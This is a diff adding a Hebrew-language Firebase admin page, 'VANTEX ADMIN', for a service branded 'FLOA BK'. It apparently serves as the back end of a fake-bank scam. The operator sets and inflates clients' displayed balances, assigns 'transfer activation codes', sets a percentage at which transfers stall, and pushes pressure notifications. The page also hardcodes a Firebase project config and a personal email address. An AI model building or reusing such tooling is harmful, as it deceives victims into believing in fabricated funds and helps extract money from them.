@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VANTEX - Admin Firebase</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--p:#6A0DAD;--bg:#f9fafb;--w:#fff;--b:#e5e7eb;--m:#6b7280;--r:#dc2626}
+*{box-sizing:border-box;font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
+body{margin:0;background:var(--bg);color:#111;font-size:13px}
+header{background:var(--p);color:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px}
+.logo{width:38px;height:38px;background:#fff;color:var(--p);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:800}
+.wrap{max-width:1100px;margin:0 auto;padding:18px}
+.card{background:var(--w);border:1px solid var(--b);border-radius:12px;padding:18px;margin-bottom:16px}
+.grid{display:grid;gap:10px;grid-template-columns:1fr 1fr}
+@media(max-width:700px){.grid{grid-template-columns:1fr}}
+label{font-size:11px;color:var(--m);display:block;margin-bottom:3px}
+input,select,textarea{width:100%;padding:9px 10px;border:1px solid var(--b);border-radius:7px;font-size:13px;font-family:inherit}
+textarea{resize:vertical;min-height:60px}
+.btn{background:var(--p);color:#fff;border:none;padding:9px 14px;border-radius:7px;cursor:pointer;font-weight:600;font-family:'Inter',sans-serif}
+.btn2{background:#fff;color:var(--p);border:1px solid var(--p);padding:9px 14px;border-radius:7px;cursor:pointer;font-family:'Inter',sans-serif}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{padding:9px;border-bottom:1px solid var(--b);text-align:right}
+th{background:#fafafa;color:var(--m);font-weight:600}
+.badge{background:#f3e8ff;color:var(--p);padding:2px 6px;border-radius:4px;font-size:10px}
+.badge-notif{background:#fef3c7;color:#92400e;padding:2px 6px;border-radius:4px;font-size:10px;margin-right:4px}
+.badge-theme{padding:2px 6px;border-radius:4px;font-size:10px;margin-right:4px;color:#fff}
+h3{font-size:15px}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">V</div>
+  <div><div style="font-weight:700">VANTEX ADMIN</div><div style="font-size:10px;opacity:.85">Firebase • בזמן אמת</div></div>
+</header>
+
+<div class="wrap">
+  <div class="card">
+    <h3 style="margin:0 0 12px">צור / ערוך לקוח</h3>
+    <div class="grid">
+      <div><label>שם מלא</label><input id="nom" placeholder="ישראל ישראלי"></div>
+      <div><label>כתובת Gmail</label><input id="email" type="email" placeholder="name@gmail.com"></div>
+      <div><label>קוד PIN (6 ספרות)</label><input id="pin" maxlength="6" placeholder="973018"></div>
+      <div><label>סכום התחלתי (מחליף)</label><input id="montant" type="number" placeholder="10000"></div>
+      <div><label style="color:#059669;font-weight:600">הוסף לסכום (+)</label><input id="addMontant" type="number" placeholder="500" style="border-color:#059669"></div>
+      <div><label>מטבע</label><select id="devise"><option value="₪">₪ - שקל ישראלי (ILS)</option><option value="$">$ - דולר אמריקאי (USD)</option></select></div>
+      <div><label>צבע ערכת FLOA BK</label><select id="theme"><option value="purple">סגול (ברירת מחדל)</option><option value="blue">כחול</option><option value="yellow">צהוב</option></select></div>
+      <div><label>קוד הפעלת העברה</label><input id="code" placeholder="ACT123"></div>
+      <div><label>הודעה לאחר הפעלה</label><input id="msg" placeholder="ההעברה אושרה ✓"></div>
+      <div><label>מדינה</label><input id="pays" placeholder="ישראל"></div>
+      <div><label>כתובת מגורים</label><input id="adresse" placeholder="רחוב הרצל 10"></div>
+      <div><label>מספר טלפון</label><input id="tel" placeholder="+972 50 123 4567"></div>
+      <div style="grid-column:1/-1"><label>התראה (מוצגת כשהלקוח לוחץ על הפעמון)</label><textarea id="notification" placeholder="החשבון שלך ייבדק מחר בשעה 14:00..."></textarea></div>
+    </div>
+    <div style="margin-top:10px">
+      <label>אחוז עצירת העברה: <b id="pv">100</b>%</label>
+      <input id="pct" type="range" min="1" max="100" value="100" style="width:100%">
+    </div>
+    <div style="margin-top:12px;display:flex;gap:8px">
+      <button class="btn" id="saveBtn">שמור</button>
+      <button class="btn2" id="resetBtn">איפוס</button>
+    </div>
+    <p style="font-size:11px;color:var(--m);margin-top:8px">💡 להגדלה: השאר את "סכום התחלתי" ריק ומלא "הוסף לסכום". לדוגמה: 500 קיים + 500 נוסף = 1000 בהיסטוריה</p>
+  </div>
+
+  <div class="card">
+    <h3 style="margin:0 0 10px">לקוחות רשומים</h3>
+    <div style="overflow:auto">
+      <table>
+        <thead><tr><th>לקוח</th><th>PIN</th><th>סכום</th><th>ערכה</th><th>קוד</th><th>%</th><th>פעולה</th></tr></thead>
+        <tbody id="tb"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3 style="margin:0 0 12px">חסום או בטל חסימת גישת לקוח</h3>
+    <label>בחר גישת לקוח. <span style="color:var(--r)">נדרש</span></label>
+    <select id="clientAccess" style="margin-bottom:12px"></select>
+    <button class="btn" id="blockBtn" style="width:100%;background:#dc2626;margin-bottom:8px">🔒 חסום גישת לקוח</button>
+    <button class="btn" id="unblockBtn" style="width:100%;background:#059669">🔓 בטל חסימת לקוח</button>
+  </div>
+
+  <div class="card">
+    <h3 style="margin:0 0 12px">פעולות על גישת לקוח</h3>
+    <label>בחר גישת לקוח. <span style="color:var(--r)">נדרש</span></label>
+    <select id="clientAction" style="margin-bottom:10px"></select>
+    <label>רשימת פעולות אפשריות על גישה. <span style="color:var(--r)">נדרש</span></label>
+    <select id="actionType" style="margin-bottom:10px">
+      <option>אפס היסטוריית העברות</option>
+      <option>מחק התראה</option>
+    </select>
+    <button class="btn" id="actionBtn" style="width:100%;background:#2563eb">בצע פעולה ←</button>
+  </div>
+</div>
+
+<script type="module">
+import {initializeApp} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+import {getDatabase, ref, push, onValue, remove, update} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAysxCgaEceZgyDu1TB7B40lwNdDMIIajg",
+  authDomain: "floa-israel.firebaseapp.com",
+  databaseURL: "https://floa-israel-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "floa-israel",
+  storageBucket: "floa-israel.firebasestorage.app",
+  messagingSenderId: "783886046561",
+  appId: "1:783886046561:web:490b06416031bfa66d2120"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const clientsRef = ref(db, 'clients');
+
+let data = {};
+let editId = null;
+
+const $ = id => document.getElementById(id);
+$('pct').oninput = () => $('pv').textContent = $('pct').value;
+
+onValue(clientsRef, snap => {
+  data = snap.val() || {};
+  if(Object.keys(data).length === 0){
+    push(clientsRef, {
+      nom: 'ישראל ישראלי',
+      email: 'avogodans61@gmail.com',
+      pin: '973018',
+      montant: 10000,
+      devise: '₪',
+      theme: 'purple',
+      code: 'ACT123',
+      msg: 'ההעברה אושרה ✓',
+      pct: 100,
+      pays: '',
+      adresse: '',
+      tel: '',
+      notification: '',
+      created: Date.now()
+    });
+  }
+  render();
+});
+
+function getThemeBadge(theme){
+  const colors = {purple:'#6A0DAD',blue:'#2563eb',yellow:'#eab308'};
+  const names = {purple:'סגול',blue:'כחול',yellow:'צהוב'};
+  return `<span class="badge-theme" style="background:${colors[theme]||colors.purple}">${names[theme]||'סגול'}</span>`;
+}
+
+function render(){
+  const rows = Object.entries(data).map(([id,v]) => `
+    <tr>
+      <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:10px">${v.email}${v.blocked?' <span style="color:#dc2626;font-weight:700">[חסום]</span>':''}${v.notification?'<span class="badge-notif">🔔</span>':''}</span></td>
+      <td><span class="badge">${v.pin}</span></td>
+      <td>${Number(v.montant).toLocaleString('he-IL')} ${v.devise||'₪'}</td>
+      <td>${getThemeBadge(v.theme||'purple')}</td>
+      <td>${v.code}</td>
+      <td>${v.pct}%</td>
+      <td>
+        <button onclick="editClient('${id}')" style="padding:4px 8px;font-size:10px;font-family:'Inter',sans-serif">ערוך</button>
+        <button onclick="delClient('${id}')" style="padding:4px 8px;font-size:10px;background:#fee;color:#900;border:1px solid #fcc;border-radius:4px;margin-right:4px;font-family:'Inter',sans-serif">מחק</button>
+      </td>
+    </tr>`).join('');
+  $('tb').innerHTML = rows || '<tr><td colspan="7" style="text-align:center;color:#888;padding:20px">אין לקוחות</td></tr>';
+}
+
+$('saveBtn').onclick = () => {
+  const addAmt = Number($('addMontant').value)||0;
+  let finalMontant = Number($('montant').value)||0;
+  
+  if(editId && addAmt > 0 && data[editId]){
+    const currentMontant = Number(data[editId].montant)||0;
+    finalMontant = currentMontant + addAmt;
+  }
+  
+  const o = {
+    nom: $('nom').value.trim(),
+    email: $('email').value.trim().toLowerCase(),
+    pin: $('pin').value.trim(),
+    montant: finalMontant,
+    devise: $('devise').value,
+    theme: $('theme').value,
+    code: $('code').value.trim(),
+    msg: $('msg').value.trim(),
+    pct: Number($('pct').value),
+    pays: $('pays').value.trim(),
+    adresse: $('adresse').value.trim(),
+    tel: $('tel').value.trim(),
+    notification: $('notification').value.trim(),
+    updated: Date.now()
+  };
+  
+  if(!o.nom ||!o.email ||!o.pin){ alert('שם, אימייל ו-PIN חובה'); return; }
+  
+  if(editId){ 
+    update(ref(db, 'clients/'+editId), o); 
+    if(addAmt > 0){
+      alert(`הסכום הוגדל ב-${addAmt} ${o.devise}. יתרה חדשה: ${finalMontant} ${o.devise}. ההיסטוריה עודכנה ב-FLOA BK.`);
+    }
+  } else { 
+    push(clientsRef, {...o, created: Date.now()}); 
+  }
+  
+  resetForm();
+  if(!addAmt) alert('לקוח נשמר. ערכה: ' + o.theme);
+};
+
+$('resetBtn').onclick = resetForm;
+
+function resetForm(){
+  ['nom','email','pin','montant','addMontant','code','msg','pays','adresse','tel','notification'].forEach(i=>$(i).value='');
+  $('devise').value='₪'; $('theme').value='purple'; $('pct').value=100; $('pv').textContent='100'; editId=null;
+}
+
+window.editClient = (id) => {
+  const v = data[id]; editId = id;
+  $('nom').value=v.nom; $('email').value=v.email; $('pin').value=v.pin;
+  $('montant').value=v.montant; $('devise').value=v.devise||'₪'; $('theme').value=v.theme||'purple';
+  $('code').value=v.code; $('msg').value=v.msg;
+  $('pct').value=v.pct; $('pv').textContent=v.pct;
+  $('pays').value=v.pays||''; $('adresse').value=v.adresse||''; $('tel').value=v.tel||'';
+  $('notification').value=v.notification||''; $('addMontant').value='';
+  window.scrollTo({top:0,behavior:'smooth'});
+};
+
+window.delClient = (id) => {
+  if(confirm('למחוק לקוח זה? הוא לא יוכל להתחבר יותר.')){
+    remove(ref(db, 'clients/'+id));
+  }
+};
+
+function refreshLists(){
+  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email} (${v.devise||'₪'})${v.blocked?' (חסום)':''}${v.notification?' 🔔':''}</option>`).join('');
+  if($('clientAccess')) $('clientAccess').innerHTML = opts;
+  if($('clientAction')) $('clientAction').innerHTML = opts;
+}
+const _render = render;
+render = function(){ _render(); refreshLists(); };
+
+$('blockBtn').onclick = ()=>{
+  const id = $('clientAccess').value;
+  if(!id) return alert('בחר לקוח');
+  update(ref(db,'clients/'+id), {blocked:true, updated:Date.now()});
+  alert('הגישה נחסמה - הוחל מיידית ב-FLOA BK');
+};
+$('unblockBtn').onclick = ()=>{
+  const id = $('clientAccess').value;
+  if(!id) return alert('בחר לקוח');
+  update(ref(db,'clients/'+id), {blocked:false, updated:Date.now()});
+  alert('החסימה בוטלה');
+};
+$('actionBtn').onclick = ()=>{
+  const id = $('clientAction').value;
+  const action = $('actionType').value;
+  if(!id) return alert('בחר לקוח');
+
+  if(action === 'אפס היסטוריית העברות'){
+    update(ref(db,'clients/'+id), {historyReset:Date.now()});
+    alert('ההיסטוריה אופסה - נמחקה ב-FLOA BK');
+  } else if(action === 'מחק התראה'){
+    update(ref(db,'clients/'+id), {notification:'', updated:Date.now()});
+    alert('ההתראה נמחקה - הפעמון יציג "אין התראות"');
+  }
+};
+</script>
+</body>
+</html>
